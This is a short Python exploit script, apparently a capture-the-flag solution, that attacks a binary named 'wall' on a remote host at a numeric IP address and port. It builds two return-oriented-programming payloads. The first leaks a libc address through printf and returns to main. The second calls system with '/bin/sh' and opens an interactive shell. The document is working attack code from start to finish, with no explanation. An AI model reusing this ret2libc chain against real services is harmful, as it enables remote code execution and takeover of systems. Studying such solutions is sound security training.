from ptrlib import *

elf = ELF("./wall")

# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")

# sock = Process("./wall")
sock = Socket("nc 34.170.146.252 40015")
# sock.debug = True

payload = b"SATOKI"
sock.sendlineafter("Message: ", payload)

payload = p64(next(elf.gadget("ret;"))) * 12
payload += p64(elf.plt("printf"))
payload += p64(next(elf.gadget("ret;")))
payload += p64(elf.symbol("main"))
payload += b"A" * (128 - len(payload))
sock.sendlineafter("What is your name? ", payload)

sock.recvline()
libc.base = u64(sock.recvuntil("M", drop=True, lookahead=True)) - libc.symbol(
    "funlockfile"
)

payload = b"TSUJI"
sock.sendlineafter("Message: ", payload)

payload = p64(next(elf.gadget("ret;"))) * 12
payload += p64(next(libc.gadget("pop rdi; ret;")))
payload += p64(next(libc.search("/bin/sh")))
payload += p64(libc.symbol("system"))
payload += b"B" * (128 - len(payload))
sock.sendlineafter("What is your name? ", payload)

sock.sh()
